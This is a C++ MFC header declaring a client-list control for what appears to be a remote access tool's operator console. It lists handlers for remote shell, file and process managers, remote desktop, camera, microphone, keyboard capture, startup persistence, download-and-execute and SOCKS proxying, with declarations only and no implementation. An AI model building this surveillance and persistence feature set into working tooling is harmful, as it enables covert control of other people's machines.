#pragma once
#include "afxcmn.h"
#include "KernelSrv.h"


class CClientList :
	public CListCtrl
{
private:
	int m_sortCol;
	int m_ascending = 1;
public:
	CClientList();
	~CClientList();
	DECLARE_MESSAGE_MAP()
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);

	afx_msg LRESULT OnKernelGetModulePath(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnClientLogin(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnClientLogout(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnEditComment(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnKernelError(WPARAM error, LPARAM lParam);
	afx_msg LRESULT OnUpdateUploadStatu(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnGetModulePath(WPARAM wParam, LPARAM lParam);

	afx_msg void OnNMRClick(NMHDR *pNMHDR, LRESULT *pResult);
	
	afx_msg void OnPowerReboot();
	afx_msg void OnPowerShutdown();
	afx_msg void OnSessionDisconnect();
	afx_msg void OnOperationEditcomment();

	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationRemotedesktop();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();


	afx_msg void OnOperationKeyboard();
	afx_msg void OnUtilsAddto();
	afx_msg void OnUtilsCopytostartup();
	afx_msg void OnUtilsDownloadandexec();
	afx_msg void OnProxySocksproxy();
	afx_msg void OnSessionExit();
	afx_msg void OnUtilsOpenwebpage();
	afx_msg void OnOperationProcessmanager();
	afx_msg void OnLvnColumnclick(NMHDR *pNMHDR, LRESULT *pResult);


	static int CALLBACK CompareByString(LPARAM, LPARAM, LPARAM);

};

